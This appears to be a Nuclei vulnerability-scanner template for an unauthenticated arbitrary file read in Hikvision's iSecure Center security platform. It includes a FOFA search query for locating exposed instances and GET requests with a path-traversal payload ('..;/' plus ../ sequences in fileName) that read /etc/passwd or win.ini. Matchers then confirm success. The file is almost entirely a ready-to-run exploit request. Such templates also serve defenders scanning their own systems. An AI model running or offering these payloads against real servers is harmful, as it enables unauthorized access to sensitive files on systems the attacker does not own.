id: hikvision-iSecure-Center-task-org-fileread

info:
  name: 海康威视综合安防管理平台 /orgManage/v1/orgs/download - fileread
  author: leadlife
  severity: high
  description: 海康威视综合安防管理平台 /orgManage/v1/orgs/download 接口存在任意文件读取漏洞。未经过身份认证的远程攻击者可通过此漏洞读取服务器上的任意文件，可能导致敏感信息泄露。
  metadata:
    verified: true
    fofa-query: app="HIKVISION-iSecure-Center" || app="HIKVISION-综合安防管理平台" || icon_hash="-808437027" || title="综合安 防管理平台"
  tags: hikvision,fileread

http:
  - method: GET
    path:
      - "{{BaseURL}}/center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd"
      - "{{BaseURL}}/center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../c:/windows/win.ini"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        status:
          - 200